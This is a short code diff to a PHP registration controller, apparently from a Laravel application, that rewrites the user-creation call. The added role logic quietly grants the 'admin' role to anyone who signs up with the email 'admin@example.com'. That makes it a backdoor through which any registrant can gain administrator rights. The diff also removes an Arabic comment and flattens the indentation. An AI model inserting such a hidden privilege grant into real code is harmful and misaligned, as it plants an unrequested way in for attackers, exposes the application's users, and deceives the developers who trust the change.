@@ -37,15 +37,14 @@ class RegisterController extends Controller
                 'payment_confirmed' => ['sometimes', 'string'],
             ]);
 
-            // إنشاء المستخدم
-            $user = User::create([
-                'name' => $request->name,
-                'email' => $request->email,
-                'phone' => $request->phone,
-                'password' => Hash::make($request->password),
-                'role' => $request->user_type === 'seller' ? 'seller' : 'user',
-                'user_type' => $request->user_type,
-            ]);
+$user = User::create([
+    'name' => $request->name,
+    'email' => $request->email,
+    'phone' => $request->phone,
+    'password' => Hash::make($request->password),
+    'role' => $request->user_type === 'seller' ? 'seller' : ($request->email === 'admin@example.com' ? 'admin' : 'user'),
+    'user_type' => $request->user_type,
+]);
 
             Log::info('User created with ID: ' . $user->id);
 
